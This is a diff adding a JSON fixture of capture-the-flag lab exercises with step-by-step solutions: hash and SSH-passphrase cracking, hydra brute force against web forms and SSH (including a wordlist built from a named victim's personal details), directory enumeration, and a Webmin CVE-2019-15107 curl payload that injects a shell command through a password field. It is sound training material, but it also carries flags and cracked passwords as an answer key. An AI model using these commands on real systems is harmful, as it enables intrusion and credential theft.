@@ -1,0 +1,318 @@
+[
+    {
+        "model": "village.exercise",
+        "pk": "mysql",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "MySQL database with MD5 passwords hashes",
+            "description": "You as a hacker have got access to the machine. There is a MySQL server running on the machine. Probably some database contains a root user's password. Flag: AC2021{r00t_sh0uld_c4re_mor3_about_d4tabases}",
+            "summary": "Get a flag from the root user's home directory on the machine.",
+            "steps": [
+                "List all services running the appropriate command.", 
+                "$ netstat -tul", 
+                "Connect to MySQL server running on localhost with default login with no password.", 
+                "$ mysql -u root`", 
+                "Using MySQL syntax collect passwords hashes.", 
+                "mysql> show databases;",
+                "mysql> use passwords;",
+                "mysql> show tables;",
+                "mysql> select * from user_passwords;",
+                "Now we can save the hashes to a file and crack them for example via `hashcat`.",
+                "$ hashcat -a 0 -m 0 hashes.txt wordlist.txt --force",
+                "One of the cracked hashes contains a password for the root user on the system.",
+                "hashcat -a 0 –m 0 [hash_file] [wordlist]",
+                "Login as a root.",
+                "$ su root",
+                "Password: iloveyou"
+            ],
+            "portainer_server": "PWDCRACK01",
+            "portainer_stack_id": "5",
+            "portainer_ip": "172.25.108.21",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "jscred",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "Hardcoded credentials in a javascript code",
+            "description": "It is a machine with some dumped backup of a compromised website. The root user uses the same password that was used for access to the website. Flag: AC2021{n3v3r_R3lY_on_ObfU5C4t10n_0Nly}",
+            "summary": "Get a flag from root user's home directory on the machine.",
+            "steps": [
+                "Read notes.txt on the user's Desktop.", 
+                "Notice that there is info about some obfuscated JavaScript code in the `notes.txt`.",
+                "> 1. Obfuscate JS - Success",
+                "> 2. Push the JS file - IN PROGRESS",
+                "> 3. Update the website folder & repo - TO DO",
+                "> 4. Change root passwd - TO DO", 
+                "Find a `secret-function.js` file in the `/var/www/secret-website` directory that is dumped from a compromised website by scenario.",
+                "After deobfuscating the code using any appropriate tool such as online deobsufcator(https://lelinhtinh.github.io/de4js/) we have a function `login()` with a username(`root`), hostname(`challenge02`), and password(`KgEHHWjzT277saPt`).",
+                "Try to login as a `root` on the same machine.",
+                "$ su root",
+                "Password: KgEHHWjzT277saPt"               
+            ],
+            "portainer_server": "PWDCRACK02",
+            "portainer_stack_id": "172.25.226.98",
+            "portainer_ip": "1",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "sshpassphrase",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "SSH passphrase cracking",
+            "description": "There is a private SSH key on the machine and John The Ripper in the home directory. Need to crack some SSH keys. Flag: AC2021{s3t_STroN6_55H_P4ssW0rD_And_pHR4s3}",
+            "summary": "Get a flag from the user's home directory on the remote victim's machine.",
+            "steps": [
+                "Read notes.txt on the user's Desktop. Find a username(`wolly`), hostname(`challenge03.target`), and even a password(`GGUSqastz74BDSXr`). Additionally, there is an SSH private key.",
+                "> 1. Setup SSH",
+                ">    - IS DONE",
+                "> 2. Set secure password for the user such as GGUSqastz74BDSXr",
+                "> 3. Add this to authorized_keys:",
+                "> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClTWumMb/rOzxRrABeZyXp+5DiE/OJIR8ycYUN5Sy6N3xiOjso5VO0Eu5U8kamHbnmXuQlrZ/OiBPSqGovyHyz+xaNR7GgFkv8NMPgN/htZltQQ0d6K1Lpjblia7GuIOVXNbSc8Y4E+jrRzBJopYva88YJ6FbLfR1SLc/B8/7RVQpi/3AH6Cs6K8ICMGuuOZlgg2Vo9kyqg6q1ryPaTisxLVjvwFQlB8dk1SOEoKW/6/peyvmoaR4woqOxzcFecNcKhqBk/NxYTzcYjJvYyckXbNyOw7IEK4mOy+Mj9hDz1HuEntkcbAlidJgity1fgcTrU9PCxUjYtK+eTASU7zEx wolly@challenge03.target",
+                ">    - STILL IN PROGRESS",
+                "> 4. Disallow ssh connection to the machine",
+                ">    - TO DO",
+                "Using JTR in the home directory crack the id_rsa passphrase.",
+                "$ python3 ssh2john.py id_rsa > crack_file.txt",
+                "$ ./john crack_file.txt --wordlist=\"/home/user/rockyou.txt\"",
+                "Connect via SSH using the username, hostname, password, and passphrase.",
+                "$ ssh -i id_rsa wolly@challenge03.target",
+                "Passphrase: newlife2007"
+            ],
+            "portainer_server": "PWDCRACK03",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.19.137",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "httpform",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "Login HTTP form bruteforce",
+            "description": "Brute force credentials for a website using hydra. Flag: AC2021{hT7p_f0RM_BruT3_F0rC3_ma7t3R5}",
+            "summary": "Get a flag from the user's home webpage.",
+            "steps": [
+                "Find a web page on `http://challenge03.target:80` host. There is a login form there. Find a comment using `Inspect element` in your web browser.",
+                "<!--Steven! Make sure that you changed your envinonmental password!-->",
+                "Now we can make an assumption that the username is `Steven`. Using `hydra` and the wordlist in home directory we can easily brute-force the password.",
+                "$ hydra -l \"Steven\" -P /home/user/wordlist.txt challenge04.target http-post-form \"/login.php:Username=Steven&Password=^PASS^&Submit=Login:Incorrect\" -I -t 64",
+                "The cracked credentials are `Steven:justice123456`"
+            ],
+            "portainer_server": "PWDCRACK04",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.161.143",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "basicauth",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "Basic Auth bruteforce",
+            "description": "There is a Flask application hosted on `challenge05.target` host and the default Flask port. Flag: AC2021{Th4ts_b4s1cally_th4t5_34sy}",
+            "summary": "Get a flag from the web root via `admin` user credentials.",
+            "steps": [
+                "Find a web page hosted on `challenge05.target` host with default flask port `5000`. There is a web page secured with basic auth.",
+                "http://challenge05.target:5000/",
+                "There is a default user with `admin` username. Use `hydra` and a wordlist in the home directory to crack the password for the admin user.",
+                "$ hydra -l \"admin\" -P /home/user/wordlist.txt -s 5000 challenge05.target http-get /",
+                "The cracked credentials are `admin:!)#)456783jing`"
+            ],
+            "portainer_server": "PWDCRACK05",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.136.184",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "sshcustom",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "Crack targeted victim's ssh password with a custom wordlist",
+            "description": "Brute force credentials for a website using `hydra` with generated wordlist via `cupp` tool. Flag: AC2021{aLW4y5_6eN3r4Te_5tr0nG_pa55W0rd5}",
+            "summary": "Get a flag from the victim's home directory.",
+            "steps": [
+                "Find file `notes.txt` on the user's desktop.",
+                "victim's username - apink",
+                "victim's computer - challenge06.target",
+                "victim's name - Anna Pink",
+                "birthdate - Sep 18, 1998",
+                "That should be enough to crack it!",
+                "Using the info from the `notes.txt` file and `cupp` tool, generate a wordlist for cracking the Anna's SSH password.",
+                "$ cupp -i",
+                "[+] Insert the information about the victim to make a dictionary",
+                "[+] If you don't know all the info, just hit enter when asked! ;)",
+                "> First Name: Anna",
+                "> Surname: Pink",
+                "> Nickname: apink",
+                "> Birthdate (DDMMYYYY): 18091998",
+                "> Partners) name:" ,
+                "> Partners) nickname: ",
+                "> Partners) birthdate (DDMMYYYY): ",
+                "Child's name:",
+                "> Child's nickname: ",
+                "> Child's birthdate (DDMMYYYY): ",
+                "> Pet's name:", 
+                "> Company name: ",
+                "> Do you want to add some key words about the victim? Y/[N]: N",
+                "> Do you want to add special chars at the end of words? Y/[N]: N",
+                "> Do you want to add some random numbers at the end of words? Y/[N]:N",
+                "> Leet mode? (i.e. leet = 1337) Y/[N]: N",
+                "[+] Now making a dictionary...",
+                "[+] Sorting list and removing duplicates...",
+                "[+] Saving dictionary to anna.txt, counting 3452 words.",
+                "[+] Now load your pistolero with anna.txt and shoot! Good luck!",
+                "Use `hydra` to brute force the password for `apink` user on `challenge06.target` host.",
+                "$ hydra -l \"apink\" -P /home/user/anna.txt -t 64 challenge06.target -I ssh",
+               " Cracked credentials are `apink:Pinkapink98`"
+            ],
+            "portainer_server": "PWDCRACK06",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.58.62",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "pdfcrack",
+        "fields": {
+            "village": "pwdcrack",
+            "title": "PDF password cracking",
+            "description": "There is a secret PDF file on a desktop with some information. But it's needed to crack the password that protects the file content. Flag: AC2021{pdf_Doc_1s_n07_tH3_S4f3sT_sT0r4g3}",
+            "summary": "Get a flag stored in the file using `pdfcrack` tool.",
+            "steps": [
+                "Find a PDF file on a desktop. Notice that the file is password-protected.",
+                "-rwxr-xr-x 1 root root 14696 Oct 30 12:03 secret-file.pdf*",
+                "Using the `pdfcrack` and the most popular wordlist `rockyou.txt` it's possible to easily crack the password.",
+                "$ pdfcrack -w /home/user/rockyou.txt secret-file.pdf",
+                "The cracked password is `booyaka619`"
+            ],
+            "portainer_server": "PWDCRACK07",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.168.43",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "dwvsite",
+        "fields": {
+            "village": "dwv",
+            "title": "Explore Dark Web Village",
+            "description": "What happens in dark web stays in dark web? Spoiler alert, it doesn't. Dark web is a breeding ground for criminal activities: illicit drugs, credit card markets, forged documents... We invite you to take a look at the dark side, browse our catalogue of deep web sites safely without having to wait a ton to load the page.",
+            "summary": "Browse the dark web yourself using our systems that are set up to access the underground sites",
+            "steps": ["Open link", "Browse dark site"],
+            "portainer_server": "DWV",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.87.220",
+            "portainer_link": ":3000/"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "sitesource",
+        "fields": {
+            "village": "asylum",
+            "title": "Inspect website sources",
+            "description": "Discover web application's public source code to get a flag that consists of two parts. Flag: AC2021{VIeW_s0uRC3_InsP3CT_elEM3nt}",
+            "summary": "Browse the dark web yourself using our systems that are set up to access the underground sites",
+            "steps": [
+                "Find a website on `challenge01.target` host.", 
+                "http://challenge01.target:80/",
+                "The first part of the flag is on the main web page (`index.html`) - `AC2021{VIeW_s0uRC3`.",
+                "<span class=\"mw-headline\" something=\"AC2021{VIeW_s0uRC3\" id=\"Urban_gaming\">Urban gaming</span>p",
+                "The second part of the flag is commented in a CSS file of the website (`style.html`) - `_InsP3CT_elEM3nt}`.",
+                ".minimizedPanel .contentsHeader {",
+                "    text-align: left;",
+                "}",
+                "/*_InsP3CT_elEM3nt}*/",
+                ".lavenderBox {",
+                "    background: #fdfdfd;",
+                "    border: 1px solid #a2a9b1;",
+                "    clear: both;",
+                "    font-size: 88%;",
+                "    text-align: center;",
+                "    padding: 3px;",
+                "    line-height: 1.7em;",
+                "    margin: 1em auto 0;",
+                "}"
+            ],
+            "portainer_server": "ASYLUM01",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.163.184",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "hiddendir",
+        "fields": {
+            "village": "asylum",
+            "title": "Hidden directory",
+            "description": "There is a secret file stored in the php web application `http://challenge02.target/`. Flag: AC2021{w0W_HoW_d1d_Y0u_f0unD_th1s}",
+            "summary": "Get a flag hidden file in the web application.",
+            "steps": [
+                "Find a website on `http://challenge.target:80/`. Using the `dirsearch` tool and the wordlist in the home directory enumerate application endpoints.",
+                "$ ./dirsearch.py -u http://challenge02.target -w ../Filenames_Doted_Common.wordlist -x 404",
+                "Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 1070",
+                "Output File: /home/user/dirsearch-0.4.2/reports/challenge02.target/_21-11-21_18-26-04.txt",
+                "Error Log: /home/user/dirsearch-0.4.2/logs/errors-21-11-21_18-26-04.log",
+                "Target: http://challenge02.target/",
+                "[18:26:04] Starting: ",
+                "[18:26:04] 200 -   98B  - /robots.txt ",
+                "[18:26:04] 200 -   23B  - /secret ",
+                "[18:26:13] 200 -   66KB - /load.php",
+                "[18:26:15] 200 -    1KB - /script.js",
+                "It is discovered `/secret` path. Now we can enumerate in this directory. As a result, we have the `flag.txt` file.",
+                "$ ./dirsearch.py -u http://challenge02.target/secret -w ../Filenames_Doted_Common.wordlist -x 404",
+                "Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 1071",
+                "Output File: /home/user/dirsearch-0.4.2/reports/challenge02.target/-secret_21-11-21_18-31-43.txt",
+                "Error Log: /home/user/dirsearch-0.4.2/logs/errors-21-11-21_18-31-43.log",
+                "Target: http://challenge02.target/secret/",
+                "[18:31:43] Starting: ",
+                "[18:31:56] 200 -   35B  - /secret/flag.tx"
+            ],
+            "portainer_server": "ASYLUM02",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.229.191",
+            "portainer_link": ":6080/vnc.html"
+        }
+    },
+    {
+        "model": "village.exercise",
+        "pk": "webminrce",
+        "fields": {
+            "village": "asylum",
+            "title": "Outdated software - Webmin with RCE",
+            "description": "There is a vulnerable Webmin service hosted on `https://challenge03.target:10000/`. Flag: AC2021{r3mot3_C0mm4Nd_eX3cu7i0N_v1a_weB_aPP}",
+            "summary": "Get a `flag.txt` file stored in the `root` user's directory.",
+            "steps": [
+                "Find WebMin service hosted on default port.",
+                "https://challenge03.target:10000",
+                "Look for known vulnerabilities for Webmin - `CVE-2019-15107`. An attacker can send a malicious http request to the password reset request form page to inject code and take over the webmin web application.",
+                "https://github.com/ruthvikvegunta/CVE-2019-15107",
+                "Send a password change request to exploit the CVE with RCE vulnerability to read the `flag.txt` file.",
+                "$ curl -ks 'https://challenge03.target:10000/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=cat+/root/flag.txt&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H \"Content-Type: application/x-www-form-urlencoded\" -H 'Referer: https://challenge03.target:10000/session_login.cgi'",
+                "Find the flag in the response.",
+                "<div class=\"panel-body\">",
+                "<hr>",
+                "<center><h3>Failed to change password : The current password is incorrectAC2021{r3mot3_C0mm4Nd_eX3cu7i0N_v1a_weB_aPP}",
+                "</h3></center>",
+                "<hr>",
+                "</div>"
+            ],
+            "portainer_server": "ASYLUM03",
+            "portainer_stack_id": "1",
+            "portainer_ip": "172.25.240.81",
+            "portainer_link": ":6080/vnc.html"
+        }
+    }
+]
